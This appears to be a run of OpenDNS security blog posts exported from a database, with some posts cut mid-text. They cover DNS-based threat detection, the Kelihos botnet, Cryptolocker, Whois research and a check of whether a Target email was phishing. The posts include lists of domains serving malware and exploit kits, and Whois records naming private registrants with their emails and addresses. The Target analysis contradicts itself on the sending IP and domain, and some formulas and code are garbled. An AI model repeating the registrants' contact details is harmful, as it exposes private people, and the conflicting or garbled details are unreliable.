While typically expensive, their ability to detect and enforce is second to none when protecting a single internet egress point. However, this approach is challenged when trying to extend protection to distributed networks, remote locations or employees constantly on the move.\nBut never fear, there is a solution!\nOpenDNS recently partnered with FireEye, the leader in APT detection and behavioral analysis, to integrate Umbrella with the FireEye Web Malware Protection System (MPS). The integration of these two security offerings represents a turning point in traditional perimeter-based security; any MPS appliance can now direct its intelligence to Umbrella to extend its layer of protection to hard-to-reach locations or roaming devices.\nIn addition to extending protection off network via our cloud-based solution, we’ve also made enabling the integration incredibly simple. While the majority of security solutions in today’s market can take significant time or professional resources to deploy, this integration allows you to extend protection in as little as 5 minutes.\nSo how does it work? Well, it’s quite simple:\n\nBy utilising a real time alerting system built into the FireEye appliance, Umbrella is able to act upon any suspicious or known malicious activity at the DNS level as soon as FireEye detects it. This means that Umbrella is able to cover any device with the built in power of Security Graph as well as FireEye’s APT and behavioral analysis, creating a true force multiplier for today’s security buyer.\nThis integration demonstrates the evolution of the traditional security perimeter; where once it was solely confined to the physical limitations of the wired network, we can now shift to the global reach of the cloud. Today’s security buyers no longer have to make the hard choice between which network perimeter or set of roaming devices to protect – they can effectively extend their perimeter of protection anywhere with this integration.\nWelcome to the new global security perimeter.', 'Announcements;Milestones;Umbrella', 'https://umbrella.cisco.com/blog/2014/02/05/opendns-fireeye-security-partnership/');

Then this week, reports began to surface about an email that claimed to be from the CEO of Target offering credit card monitoring services:\n\nOn the surface, the email displayed all the classic signs of a phishing email:\nThe “from” address was from a suspicious domain, bfi0.com\n\n\nThe Target logo is not properly displayed\n\n\nThe email offers free credit monitoring services, which is a classic phishing scam\nSocial media sources began throwing red flags signaling that the email may have been fraudulent:\nTarget spox says the bfi0(dot)com emails are legit. Why use that domain for a sensitive issue? “We are sending tens of millions of emails”\n— Geoffrey Fowler (@geoffreyfowler) January 17, 2014\n\nWas this email spam, though?\nThe Email\nIf the email was spam, the first thing to investigate is how millions of copies made it past spam filters. For that, we look at two pieces of information – DKIM and SPF records. DKIM uses cryptography to “prove” who the sender was, and SPF is a tag on websites that show who is allowed to send email from that domain.\nFor the Target email, I looked at the headers and GMail validated both DKIM and SPF for the domain. This meant that bfi0.com sent the email – the “From” address was not being faked. The DKIM and SPF validation also meant that it helped the credibility of the email as it passed through spam filters.\nReceived-SPF: pass (google.com: domain of 11cfdf3aclayfovcia3lqanaaaaaab25u3dxc7ikjmiyaaaaa@target.bfi0.com designates 206.132.3.171 as permitted sender) client-ip=206.132.3.171;\nAuthentication-Results: mx.google.com;\n       spf=pass (google.com: domain of 11cfdf3aclayfovcia3lqanaaaaaab25u3dxc7ikjmiyaaaaa@target.bfi0.com designates 206.132.3.171 as permitted sender) smtp.mail=11cfdf3aclayfovcia3lqanaaaaaab25u3dxc7ikjmiyaaaaa@target.bfi0.com;\n       dkim=pass header.i=@target.bfi0.com\nReturn-Path: <11cfdf3aclayfovcia3lqanaaaaaab25u3dxc7ikjmiyaaaaa@target.bfi0.com>\nDKIM-Signature: v=1; a=rsa-sha1; d=target.bfi0.com; s=ei; c=simple/simple;\n q=dns/txt; i=@target.bfi0.com; t=1389913363;\n h=From:Subject:Date:To:MIME-Version:Content-Type;\n bh=0Tw0KwI1VkkrQDwTITKqSCMS6YA=;\n\nb=FerspETyfmnYlcbO+Noxgge27afmUdcuFZ9bdu4gyCueCtCWEWUOvFfWgW5ePrRm\n\nXyJNZy37Mz3YYkAIVYpnL6e2ddvzXvtxCdQduRM0B3PWJa6aWX9u2Uaw+DKietIH\n 8l7gdyBl+IVlaxCimKVkwRpw/bX1jRjjCvh/1H1Vupk=;\nDomainKey-Signature: q=dns; a=rsa-sha1; c=nofws;\n s=ei; d=target.bfi0.com;\nThe Server\nNow that the Target email can be definitely traced to bfi0.com, we investigate the server to see if it is suspicious. At first glance, visiting the domain gives a blank page – suspicious. However, upon deeper inspection, the domain WhoIs data reveals that it is owned by Epsilon.com – a division of Alliance Data, a $12 Billion publicly-traded marketing services company.\nSecurity Graph Inspection\nThe OpenDNS Security Graph shows that bfi0.com is a high-traffic domain – it receives about a quarter as many DNS queries per hour as Target.com. Furthermore, initial algorithmic analysis shows that the domain is benign.\nAnalyzing the IP address behind the domain provides the most telling information about the Target email. The IP address behind bfi0.com hosts over 100 known domains. Some of these are subdomains of well-established websites, including:\nalerts.chase.com\n\n\nsupport.firstfederal.com\n\n\nemail.amtrak.com\n\n\nemail.charter.net\n\n\nemail.coldwellbanker.com\n\n\nemail.discover.com\n\n\nemail.fourseasons.com\n\n\nemail.mckinsey.com\n\n\nemail.nationalgeographic.com\n\n\nemail.sea.samsung.com\n\n\nemail.target.com\n\n\nemail.target.ca\nThese domains include reputable banks and Fortune 100 companies. The last two domains on the list link the Target corporate website to the server sending emails for bfi0.com.\nPhishing or Official?\nThe conclusion: Official\nBased on OpenDNS Security Graph research and DKIM, we can both verify that this email came from the IP address 206.132.3.45 behind bhi0.com, and we can confirm that this server also powers email.target.com.\nWhy did the email come from such an obscure domain? It appears that bfi0.com is the default sending address for an email service used by dozens of Fortune 100 companies. In this case, it appears that Target failed to configure the “from” address to match their domain, email.target.com.', 'Security Graph;Security Research', 'https://umbrella.cisco.com/blog/2014/01/17/phishing-official-targets-credit-card-monitoring-email-bfi0-com/');

Information including the name, mailing address, phone number or email address of the users (assignees) of these entities are stored and published in Whois databases.\nWe’ve used Whois data to observe links between bad entities, and associate threats with bad actors in the past (big data threat detection, yahoo mail compromise).\nHowever, Whois information is rather limited, if not entirely useless, in identifying bad actors. Due to the lack of data verification (as pointed out here), we don’t expect bad actors to use their real information when registering domains for malicious purposes.\nIn addition to that, bad actors can choose to hide the Whois registrations by using privacy protection domain registrars. There are plenty of privacy protection registrars, which are used by several legitimate users out of real privacy concerns.\nThat said, we decided to take the dive and do some data crunching with a proprietary Whois database. In this post, we’ll share some of our findings and use cases.\nMany domains are registered but never used\n90% of the domain names registered less than 8 days ago don’t receive any traffic from OpenDNS users. One reason is that a large number of these sites host bogus content – or no content at all. There are name dealers who buy domain names in bulk and hold them to sell for a premium. Domain names are often also registered against brand name cybersquatting.\nEvery day, about 90,000 new domains are registered within the .com zone alone. However, more than 6.61% of them vanish within 5 days. They usually are registered for a year, yet the Whois registry for these domains doesn’t show any records for them more a few days after they have been registered. (As a note: under some conditions, registrars can withdraw a new registration if it hasn’t been paid for within 5 days.)\nThis led to a practice referred to as domain tasting. Here is a list of .com domain names that were registered on 2014-01-07, only to vanish a few days later.\nTo our surprise, we didn’t observe many domain tasting sites being used to serve malware, or for phishing. From the above list, only 3 of them were found to be malicious. However, these were heavily used for SEO and spam. \nExploit domain distribution sites are seen with varying life cycles\nIt’s easy to think that well-established domain names are less likely to be serving malware than domains that were recently registered. However, it has become fairly common for malware to not only use compromised web sites, but also compromised domains. When a domain is compromised, the previous records are not altered – but additional records leading to malicious IPs are added. This is a clever way to fool security products by serving malware while still inheriting the “good reputation” of a domain.\nThe Angler Exploit Kit has been relying heavily on this tactic. On average, domains used to serve this exploit kit had been registered 1,388 days before the malicious DNS records were added.\nThe infamous Urausy ransomware is one of the many examples of malware relying on dynamic DNS services. It relies on domain names that were registered no less than 12 years ago!\nOn the other hand, the popular Magnitude Exploit Kit typically relies on domain names that were registered at most 24 hours before being active.\nThe Neutrino Exploit Kit is also an interesting case: traffic starts being observed 3 days (on average) before the domain is actually registered.\nDomains used by the Nuclear Exploit Kit are registered between 1-100 days before becoming active, and we’ve observed a similar range for the Grandsoft Exploit Kit.\n\nMany black hat SEO and spam sites are observed with huge spikes of traffic \nEvery day, an enormous amount of domains are actually being registered for mass marketing, spam, black hat SEO and rogue pharmacies. We also see companies and individuals registering a massive amount of new domain names every day, with each of the domains immediately receiving an unusual number of DNS queries coming from clients all over the world.\nAs an example, numerous domains registered by “Audacity Media”/”Yellow Media” follow this pattern – featuring a big spike of traffic that doesn’t last more than a single day:\n(Please see more details about the sd tool we used in the following data dump at the end of the blog.)   \n$ sd -o stone-wav3s.us\n         0         0         0         0         0         0         0         0         0         0         0         0         0         0     56300 ******************************************\nCreated on: 2014-01-13 14:34:25 +0000Updated on: 2014-01-13 14:34:26 +0000Registrar: Wild West Domains, Inc.Registered by:Jessie Valle <jessievalle16@gmail.com>, Audacity-Media2637 E Atlantic Blvd#25405 - 33062 Pompano Beach - USName servers:        ns05.domaincontrol.com        ns06.domaincontrol.com\nOn the same infrastructure:        00004446.stone-wav3s.us        00008100.stone-wav3s.us        0000db52.stone-wav3s.us        0000e5ab.stone-wav3s.us        00018c60.stone-wav3s.us        00025c8f.stone-wav3s.us        00027960.stone-wav3s.us        00033988.stone-wav3s.us        000339cc.stone-wav3s.us        0003da11.stone-wav3s.us        00053035.stone-wav3s.us        ...and 48 other names\n$ sd -o botiriddi.me\n         0         0         0         0         0         0         0         0         0         0         0         0         0     28427 ******************************************       304\nCreated on: 2013-07-16 20:59:04 UTCUpdated on: 2013-09-15 20:50:04 UTCRegistrar: NameCheap R216-MERegistered by:Yellow Media <yellowmedia13@gmail.com>, Yellow Media2637 E Atlantic Blvd#24199 - 33062 Pompano Beach - USName servers:        dns1.registrar-servers.com        dns2.registrar-servers.com        dns3.registrar-servers.com        dns4.registrar-servers.com        dns5.registrar-servers.com\nOn the same infrastructure:        botiriddi.me        www.botiriddi.me        0000ecd5.botiriddi.me        00018aa4.botiriddi.me        00032955.botiriddi.me        0003b2e0.botiriddi.me        00042e80.botiriddi.me        000657cc.botiriddi.me        0006cac3.botiriddi.me        00073931.botiriddi.me        00095cb2.botiriddi.me        ...and 19 other names\nThese domains resolve to a large set of IPs, all of them hosting a web server showing nothing more than a default Apache page. Even though our emails to the administrative contacts for these domains never received a reply, we can presume that these domains are being used for mass marketing, not to distribute malware.\nMore on the sd tool \nThe OpenDNS Security Graph is our unique database of DNS queries, on top of which we built reputation systems.\nA simple way to access it programatically is to use the Security Graph client library, which has been specifically designed for security researchers.

I teamed up with Hendrik Adrian (@unixfreaxjp), founder of MalwareMustDie, to give a talk detailing our campaign against the Kelihos Fast Flux Botnet. Our session consisted of multiple parts – in my section, I focused on the domain, IP monitoring and data analysis of different elements of the infrastructure of the botnet.\n\nFirst, I described the different components of the fast flux monitoring system (which has been operational since early July and was presented at APWG eCrime 2013). Building this system was the outcome of successive studies on fast flux and Kelihos [1][2][3]. The system detects new Kelihos domains in real time, as soon as they trigger DNS traffic, which is made possible thanks to the large visibility of OpenDNS into Internet traffic. The system also monitors the growth of the botnet on a continuous basis.\nWe then shifted focus to show statistics and trends on various elements of the Kelihos botnet that stress the extent and actuality of this threat. Given a sample of 900+ Kelihos domains collected since mid-summer of 2013, we described the following features:\nTLD distribution\nBotnet geo-distribution\nBotnet’s live hosts daily cycle\nOS distribution\nDaily detected Kelihos domains\nDomains and IPs lifetime\nMalware sample statistics and detection ratio\nSome notable facts about the Kelihos botnet are:\n900+ fast flux domains and subdomains have been used by Kelihos malicious campaigns\nThe most abused TLDs have been .ru, .com, and .net\nThe Kelihos botnet has infected hosts in 100+ countries\nThe current size of Kelihos is about 44,000+ bots\n11,000+ IPs have hosted Kelihos domains\nThe most infected countries are Ukraine, Taiwan, Russia, Japan, and there are also infections in the US\n85% of bots are running Windows XP/Vista (from a sample)\nA small number of Kelihos domains stayed active for nearly 2 months, acting as nameservers for other Kelihos domains, with the majority of domains having a lifetime of 1 day or less\nA small number of botnet IPs stayed active for up to 3 months, and some were active even longer. These “zombie” IPs point out the real challenge of cleaning up infected machines. Some of these long lasting infected hosts are in universities. The majority of IPs had a lifetime of 1 day or less\nBelow, we show the geographical distribution of a snapshot of the botnet’s 40,000+ live hosts:\n\n\n\nIn the figure below, we show the daily fluctuations of the number of live Kelihos bots over the first 2 weeks of December 2013. The daily cycle follows the time zone of Ukraine and Russia (UTC+2), i.e. the number of live bots peaks during busy computer usage hours, and drops during the night hours.\n\nFor the sake of visualization, the animations below show the daily cycle of live bots over a period of 2 weeks. The first animation is based on the IP infection maps of Kelihos followed by the world map view. These animations were a collaboration with my colleague @ThibaultReuille:\n\n\nUsing the data collected while preparing this talk, Kelihos was also featured in OpenDNS Security Labs’ 2013 Most notable attacks visualization microsite.\nThe remaining parts of our BotConf presentation are greatly described in MalwareMustDie’s blog, in which @unixfreaxjp analyzed the weaknesses of Kelihos, which helped us investigate and infiltrate the botnet. We then disclosed the identity of the bad actor, and finally, discussed the best methodology to neutralize or slow down Kelihos by stopping the payload distribution from the CnCs to the bots. (Keep in mind that bad guys adapt and adjust their infrastructure and MO, so the fight is still on.)\nNeedless to say, the progress and good results achieved by “Operation Kelihos” would not have been possible without the outstanding collective work and efforts of the tireless members of MalwareMustDie.\nThe Conference:\nSeveral blogs have been posted since last week that provide great recaps of BotConf’s busy two days. We encourage you to check them out: [4][5][6][7][8][9][10].\n\nThere were several talks that caught my attention and interest. Just to name a few:\nDistributed Malware Proxy Networks – Brad Porter and Nick Summerlin\nSpam and All Things Salty: Spambot v2013 – Jessa dela Torre\nUsing cyber intelligence to detect and localize botnets – Enrico Branca\nSpatial Statistics as a Metric for Detecting Botnet C2 Servers – Etienne Stalmans and Barry Irwin\nThe Home and CDorked campaigns : Widespread Malicious Modification of Webservers for Mass Malware Distribution – Sébastien Duquette\nMy Name is Hunter, Ponmocup Hunter – Tom Ueltschi\nAPT1: Technical Backstage – Paul Rascagnères\nEuropol and European law enforcement action against botnets – Jaap van Oss\nDNS Resolution Traffic Analysis Applied to Bot Detection – Ronan Mouchoux\nExploit Krawler: New Weapon againt Exploits Kits – Sébastien Larinier and Guillaume Arcas\nThe hunter becomes the hunted – analyzing network traffic to track down botnets – Thomas Chopitea\nI take my hat off to the organizers for the outstanding execution of the conference: “Un grand Bravo à Eric et co.” The speakers delivered excellent and high quality presentations.

Beyond threat protection, we take our responsibility as security professionals seriously and make every effort to keep our audience informed of the latest developments with this and other malicious Internet events.\n\nLast week, we hosted a webcast discussing in greater depth the way Cryptolocker attacks and how the IT security community has reacted to stop this threat. In addition, we revealed how we proactively contained Cryptolocker before it was recognized as a threat and why we’re able to stay ahead of new variants.\nDuring the end of our presentation, we enjoyed a stimulating discussion with our audience as they asked many pointed questions related to the Cryptolocker threat and others like it. For the benefit of all, we decided to share a few of the most riveting ones.\nSince Cryptolocker’s evasion method depends mostly on its Domain Generation Algorithm, is there a critical frequency at which new domains are introduced after which the power of predictive analytics would fail?\nOur analytics monitor small time windows for DGA names requested in association. Malware-infected systems will periodically attempt to phone home, and when they do, they will go through a pre-determined number of domain name candidates generated at that time. DNS queries are resolved within milliseconds, so whether it is a few to a 1000, the time frame over which the malware will exhaust its attempts is within our small time window. Neither the frequency of the phone home attempts, nor the number of domain name candidates generated is critical. Also, if new versions of the DGA are released, it will not cause the analytics to fail. The analytics examine the malware-infected systems’ DNS query behavior only, rendering the DGA itself behind these names irrelevant.\nIf a bot uses a hardcoded IP address, can the web gateway do a reverse lookup against your database before it allows the connection?\nWhile many bots avoid hardcoded IP addresses because they’re easy for law enforcement or security providers to work with ISPs to shutdown, they do still exist. Today, we don’t intercept the direct IP-based connection to enforce it; however, we’re actively working on a solution to fill this gap.\nEven without this capability, our unique layer of network security helps protect organizations from many threats or vulnerable systems (e.g. users roaming outside the network perimeter) that traditional security solutions can not. But there’s never a silver bullet, so its important to choose the right complementing layers. A firewall with a built-in blacklist of known malicious IPs could help, but most firewall providers don’t have the global visibility or predictive analytics to catch what we can.\nDoes this work for polymorphic P2P bots like Zeus Gameover that generates thousands of random domains per day, and doesn’t have a central Command and Control server?\nMost malware today is either polymorphic or metamorphic, but these terms relate to the binary variants that are generated – not the phone home activity to C&C servers.\nZeus has become a family of various variants of malware. The variant you’re describing is using a DGA (domain generation algorithm) with a fast flux network, which is exactly the same as Cryptolocker. In fact, this has been occurring frequently since 2007. The “Conficker” family of malware was the first big botnet to use a DGA. “Storm” was the first big decentralized P2P botnet to use fast flux. Today, DGAs, fast flux, double fast flux (i.e. decentralized malicious DNS name server), and DNS tunneling is used. For a deeper dive on this topic, you can read our white paper on the role of DNS in botnet command and control.\nSo yes, we would predict the domains that Zeus uses, and the corresponding and/or associated IPs in a similar way to Cryptolocker. However, we have dozens of other algorithms that detect co-occurring DNS requests, DGA-looking domain names, and other complex patterns that may also be applied to Zeus.\nHow does OpenDNS deal with a DNS changer type compromise where the users DNS settings  are altered and no longer point to OpenDNS?\nWe always recommend that customers set firewall rules to prevent DNS traffic to be sent to any IP address other than OpenDNS’s two anycast addresses. This best practice will mitigate threats that maliciously change the system’s DNS settings.', 'Umbrella;Webcasts', 'https://umbrella.cisco.com/blog/2013/12/16/wrap-containing-cryptolocker-webcast/');

It lets us connect 50 million people a day to the Internet with our free home DNS service, predict malware outbreaks in the OpenDNS Security Labs, and provide scalable security enforcement and threat protection with Umbrella. How does an Internet protocol invented 30 years ago serve so many purposes? In this post, I’ll be taking an in-depth look at DNS – what it is, what makes it work, and how we use it to safely connect people to the Internet anywhere and anytime.\nWhat is DNS?\nDNS is the address book of the Internet. Computers identify themselves with an “Internet Protocol Address,” or an IP address. When you connect to websites, they also have an IP address. For example, the IP of the OpenDNS website is 67.215.92.219. When you connect to this site, the address bar on your browser doesn’t show 67.215.92.219 – it shows blog.opendns.com – but if you type our IP address into your address bar, you still get to our website!\nIn that example, blog.opendns.com and opendns.com are domain names. They were invented by early Internet researchers so that they could avoid remembering long IP addresses – instead, they created more human-friendly names, like opendns.com.\nWhen you type opendns.com, you still connect to our server. This is because your computer looks up opendns.com to find the IP address that it connects to. Your computer initiates about a thousand DNS queries every single day – websites, software updates, and even phone apps rely on the service. There are too many sites on the Internet for each computer to keep a complete list, so DNS servers act as an address book when computers look up domains.\nThat’s the basic premise of DNS – when you want to connect to a website or other application server, it tells your computer which address to connect to.\nWhose DNS am I using?\nThere are tens of thousands of recursive and authoritative DNS servers in the world. If you have never tinkered with DNS in the past, you probably use the recursive DNS servers of whoever provides your Internet. At your house, this may be a cable company. On your phone, it is your cellular provider. At the coffee shop down the street, it’s their Internet Service Provider.\nNot all DNS services are created equally. If the recursive DNS service you use breaks, you cannot connect to websites. If the DNS service you use is slow, then your connection to websites will be slow. If your DNS servers are not up-to-date, then you may not be able to connect correctly to websites.\nOpenDNS started its DNS service to provide everybody with the most reliable, safest, smartest, and fastest Internet connectivity in the world. If you want to take control of your DNS, learn how to set up OpenDNS on your devices. You can always check whether you are using OpenDNS by visiting welcome.opendns.com.\nHow can DNS be used to find malware?\nWith 50 billion DNS lookups going through the OpenDNS Global Network every day, we have a window into the Internet. In our mission to connect the world with confidence, we formed OpenDNS Security Labs to predict emerging threats by analyzing how attackers leverage criminal infrastructures on the Internet to launch attacks.\nOur Security Labs team has access to all the data our global network acquires, and they use it to examine how the whole Internet works and changes. Bad things like malware, spyware, phishing, and other scams rely on DNS, so we utilize the power of Big Data to search for, identify or even predict these malicious domains.\nThe results of the research can be pretty beautiful. With machine-learning systems, the OpenDNS Security Labs can predict the behavior of malware and botnets before attacks happen. The result of this data and research is a product called the OpenDNS Security Graph. It’s basically a contextual search engine for the infrastructure of the Internet. Searching for domains, IP addresses, or other routing protocols shows the OpenDNS Security Labs prediction of whether a site is good or bad.\nHow can DNS stop me from connecting to malware?\nBy combining DNS and Security Graph, OpenDNS released Umbrella – a full security enforcement solution in the cloud. Umbrella makes the “address book” of DNS smarter–when Umbrella customers look up a domain like opendns.com, our DNS servers add in one extra step. The DNS service checks where you want to go in Security Graph – in this example, opendns.com – to see if the domain and the address you want are both safe. If they are, the service gives you the correct address, and your Internet browsing continues with the same speed as normal DNS.\nHowever, if Security Graph has flagged the domain or the address as malicious, Umbrella stops you from connecting by redirecting you to a block page indicating that the site is unsafe. Umbrella takes the address book of the Internet and cuts out the bad parts so that your computer cannot even find the addresses of harmful servers.\nThe best part about Umbrella is that it is built into the OpenDNS Global Network, with data centers around the world. You do not have to install anything – setting up Umbrella for your business can be as easy as setting up the OpenDNS home service.\nWhat is the future of DNS-based security?\nSome websites on the Internet are good, but host bad things. For example, file-sharing websites or blog services are sometimes misused for malicious activities. To address this, Umbrella now offers the Intelligent Proxy.\nProxying works like a guarded door–it lets most things through, but if the guard sees something bad coming, it shuts the door to protect you. With the Intelligent Proxy, when your computer makes a DNS query for a site that sometimes hosts bad content, the Intelligent Proxy kicks in to protect you. Instead of returning the correct address of the website, the DNS server returns the address of the Intelligent Proxy, where OpenDNS security software can take a deeper look at everything.\nWhile browsing the Internet, you will never realize that this extra level of security is protecting you–your computer thinks the address of Intelligent Proxy is the website it wants, so it behaves normally.\nConclusion\nDNS makes the Internet work. After reading this primer, you should have a better idea of how that’s accomplished, and how that technology can be applied to security. Although we rarely think about it, this quiet protocol controls our access to the Internet, making it important in our everday security. OpenDNS has been delivering reliable and safe DNS to millions of people around the world for seven years, with zero downtime, which is almost as incredible as DNS itself.

In fact, this past Cyber Monday was the biggest in history, with deal seekers spending an estimated $2.29 billion on gifts for their loved ones (or for themselves). But with great convenience comes great danger; criminals are lying in wait for unsuspecting consumers to fall into their traps.\nWe’ve detailed this phenomenon on our Labs blog, with Security Researcher Ping Yan examining Black Friday scams – but the trend will continue throughout the season. Give your family IT specialist one less thing to do while they fix your computer after dinner by following these 10 tips for secure holiday shopping:\n1. Make sure your software is updated. Keeping your browser and anti-virus up to date, and ensuring that you have the latest OS patches installed should be the first stop on your virtual shopping journey.\n2. Only shop with reputable online retailers. Although other sites may advertise “unbeatable deals,” you may be signing up for malicious attacks. Stick to the official pages of stores you are familiar with. Checking the contact information section is a good way to judge a site: if an email contact is the only method listed, you may want to do more research.\n3. Another way to ensure your transactions are legitimate is to check for security symbols on the site. If the URL: if it begins with HTTPS, it indicates a secure page. You can also check for a padlock or key symbol in the address bar.\n4. If you’re doing your shopping on a mobile device, be sure to use apps purchased from official sources, like Apple’s App Store or Google Play. This will decrease the chances of downloading a malicious application.\n5. Stick to your own devices when it comes to online shopping – you should never enter sensitive information, such as personal or financial details, into a public computer. Also, make sure your wireless connection at home is secure and password-protected.\n6. Speaking of personal data, avoid oversharing when completing an order. Don’t give away more details than necessary – if a store is asking for in-depth information that has nothing to do with the sale, you may want to think twice.\n7. A paper trail is still important, even in the digital age. Keep a copy of any and all receipts you receive during your retail marathon, and check your card statements regularly. Any suspicious activity or purchases could be a sign of compromise.\n8. Tis’ the season for giving – and for scamming. People are more generous during the holidays, and criminals take full advantage this. Protect yourself by being selective, and thoroughly researching any cause you plan to donate money to this year.\n9.) Consider using credit cards instead of debit. If your card information IS stolen, credit companies are more likely to cover the fraudulent charges – a criminal with free reign over your bank account won’t be as nice.\n10.) “If it looks like a duck, and quacks like a duck, we have at least to consider the possibility that we have a small aquatic bird of the family Anatidae on our hands.” The same can be said for suspicious-looking websites. If you have to think twice, that is one time too many. Steer clear of these domains.\nFollowing these tips should help you stay safe and avoid getting ripped off (by malware, anyway)!

In this blog post, we will focus on one processor dedicated to spotting a specific category of suspicious IP addresses.\nIt is uncommon for an IP address to suddenly have many new domain names map to it, where there was none prior. Of course a hosting service, a load-balancing service, a CDN or a user moving a lot of domains to a new server can follow this pattern, but benign cases are both infrequent and relatively easy to distinguish from suspicious activities.\nIn our research, we define an IP address as being “dormant” if less than N names mapping to it have been observed in the past 7 days, and as “hyperactive” if more than M names mapping to it have been observed during the past 4 hours.\nOne stream we generate is a list of recently observed pairs (name, IP address).

When an IP address becomes “hyperactive,” new names are usually piling up at a very high rate, so the IP will eventually be labeled.\nInstead of keeping track of individual domain names that mapped to each IP, we use the HyperLogLog algorithm that we ported to the Rust programming language.\nThe beauty of this algorithm is that the complexity and memory usage remain constant no matter how many elements are in the set.\nOur stream processor keeps an in-memory set of IPs, and for each IP, two HyperLogLog estimators.\nThe former (“current”) estimates the number of names recently observed for a given IP. The latter (“archive”) estimates the number of names observed more than 4 hours ago.\nWhen a new entry for an IP is read from the stream, we check the age of the “current” estimator. If this estimator has been in use for more than 4 hours, we merge the content of this estimator to the one dedicated to archival and reset the “current” estimator.\nThanks to the HyperLogLog algorithm, merging is a very fast and constant-time operation.\nIn order to detect hyperactive IPs that recently transitioned from being dormant, the stream processor estimates the cardinality of each IP using the “archive” estimator, then the cardinality of the same IP using the “current” estimator. If the former is below N (which we empirically set to 3) and the latter above or equal to M (currently 10), we print the current cardinality, the name and the IP:\n88  5fd40.93taotao.com. 23.104.41.152\n52  2l7d9.jjrnp.com.    23.244.38.15\n153 14q3f.wzstorm.com.  23.244.38.77\n107 shishicaizuiyizhongjiangdewanfa.gzhsfisher.com. 23.235.132.36\n71  qo73p.yqhxnhcl.com. 172.246.178.62\n95  mianfeiqipaiyouxipingtai.gzaqgy.com.    23.244.57.126\n136 35441.dlyjzs.com.   23.244.38.85\n46  ppyulechengwangzhandizhishishime.5udate.com.    173.234.231.103\n99  ouzhoubeijuesai.axcych58.com.   23.244.57.92\n45  gongjihuichengyuan.jjkho.com.   5.226.171.35\n12  overlay.ringtonematcher.com.    216.137.55.127\n46  i-mhow.com. 141.101.117.162\nSorting recent entries of this new stream yields domain names mapping to the most hyperactive IPs:\n571 sge.su\n    553 sxo.su\nThese domains happen to be currently used by the Caphaw trojan.\nFiltering by name patterns and TTLs immediately shows more interesting domains (listed below) being used by the Nuclear exploit pack:\n81 thinkmetal.biz\n     46 cosmogift.biz\n     37 lightcasa.biz\n     36 movieprice.biz\n     32 moviehello.biz\n     31 timequality.biz\n     31 infoobesity.biz\n     31 comwin.biz\n     30 flypanda.biz\n     26 expertsurvey.biz\n     20 eurosync.biz\n     18 spymac.biz\n     18 sharerebel.biz\n     16 cybervirtual.biz\n     10 drcoupon.biz\nThese domains can be active for a very short period of time, so blocking them as fast as possible is critical.\nTo put all this in context, the OpenDNS Security Graph is centered on the concept of being fast, predictive, and adaptive.

Often, we’re interested in understanding the distribution of the IP addresses we are looking at in terms of geolocation as well as IP prefixes/ranges. For example, in our studies of the Kelihos botnet or the Cryptolocker ransomware, we can gather a list of the infected client IPs and observe the impact of the infection. It definitely helps us appreciate the magnitude and the nature of the problem.\nBefore we go into more details and interpretations, let’s introduce our layout technique and some important facts about the Internet.\nGeometric concept\nIP to 2D space\nAn IPv4 address is made of 4 natural numbers between 0 and 255. In the mathematical sense, it can be seen as a 4-dimensional integer vector.\n[I = left ( mathbb{Z} cap  [0, 255] right )^{4}]\nNow, the whole idea is to build a function f to transform this IP into a 2-dimensional real vector. Then if we take the whole IP set and apply this transformation to every IP, we will build a 2D point cloud that will represent our IP set.\n[f : I rightarrow mathbb{R}^{2}]\nIn other words, it is a projection of the IP space into the [mathbb{R}^{2}] space. There are many ways to do so—today we’re going to present a few approaches. But first, let’s rescale our IP addresses to be a bit more manipulable.\n[Let i  in I,  i = [A, B, C, D]\\Let j = frac{1}{255}i = frac{1}{255}[A, B, C, D] = [a, b, c, d]]\nGreat! Now we have an IP address (a, b, c, d) where every component is rescaled between 0 and 1.\nNow let’s define our transformation function:\n[f(a,b,c,d) = left{begin{matrix}(r + wb)cos alpha + r’dcosgamma\\(r + wb)sin alpha + r’dsingamma\\end{matrix}right.]\nwith\n[left{begin{matrix}r = 32 rightarrow inner radius\\ r’ = 0.5 rightarrow disk radius\\ w = 255 rightarrow arc width  \\ end{matrix}right.]\nand\n[left{begin{matrix}alpha = frac{7pi a}{4}-frac{3pi}{8} rightarrow arc angle\\gamma = 2pi c rightarrow disk angle\\\\end{matrix}right.]\nThese formulas may scare you if you haven’t done trigonometry in a while but it is actually very simple. The function can be split in two parts :\n[f(a,b,c,d) = left{begin{matrix}(r + wb)cos alpha\\(r + wb)sin alpha \\end{matrix}right.+left{begin{matrix}r’dcosgamma\\r’dsingamma\\end{matrix}right.]\nThe first part is the definition of our arc using polar coordinates. We use an inner radius and a width variable to control its shape. The second part is the definiton of a disk in polar coordinates as well. What we have here is the definition of two systems: one using A and B to find a position in the arc given a certain inner radius and width, and the other one using C and D to find a position around the former point given a certain disk radius. A and C are rescaled on the trigonometrical circle to define angles, B and D are used as distances from the origin (radius).\nIn simpler words :\nThe arc represents the whole IP space (center right is 0.0.0.0, center left is 255.255.255.255)\nA line from the center represents an A.*.*.* IP range\nA point in the arc represent an A.B.*.* IP range\nA bright point represents a denser /16 prefix in A.B.*.*\nA dim point represents a sparser /16 prefix in A.B.*.*\nColoring\nNow we have a point cloud built from an IP set, how do we color it ? First we give a color to every point. In our case, the color represents either a continent code or a country code. It could be something completely different. Then, for each pixel of the texture, we search for the nearest point in the cloud and take its color. This structure is also known as a Voronoi diagram, and it’s heavily used in area analysis and computational geometry. In our case, we’ll use it to represent continent or country territories.\nHere is what a Voronoi diagram looks like :\nTo obtain the final result, we need one last thing. We scale the pixel color relatively to its distance to its nearest point to achieve the gradient effect.Note, however, that we don’t necessarily have to use the Euclidian distance for our purpose; different distance functions will give different outputs (Ex: Manhattan distance).\nIn our case we use the logarithm of the euclidian distance:\n[Let overrightarrow{P} be our current pixel position\\ Let overrightarrow{N} be the nearest point position\\Let overrightarrow{D} be overrightarrow{P}-overrightarrow{N}][tint(overrightarrow{D}_{x,y}) = frac{1}{log(1 + sqrt{x^{2} + y^{2}} + varepsilon) } with varepsilon > 0\\\\color(overrightarrow{P}) = tint(overrightarrow{D}) * overrightarrow{N}_{color}]\n\nInternet territories\nNow that we have our geometrical model ready to go, we would like to use it on a couple of datasets. But before we do that we need to focus on a very important point in order to make an accurate diagnosis.\nConsider the two pictures below : The first one is a continent view (Colors are Continent Codes), the second is a country view (Colors are Country Codes)\n\n\n|\nThese pictures have been created by generating 10000 random IP addresses with a uniform distribution :\ndef populate_random_ips(count):\nfor i in range(count):        a = random.choice(range(0, 255))         b = random.choice(range(0, 255))        c = random.choice(range(0, 255))        d = random.choice(range(0, 255))\nload_ip(str(c) + \".\" + str(d) + \".\" + str(a) + \".\" + str(b))\nThen, we use the GeoIP library to get a continent and country code. We associate one color for each code and run 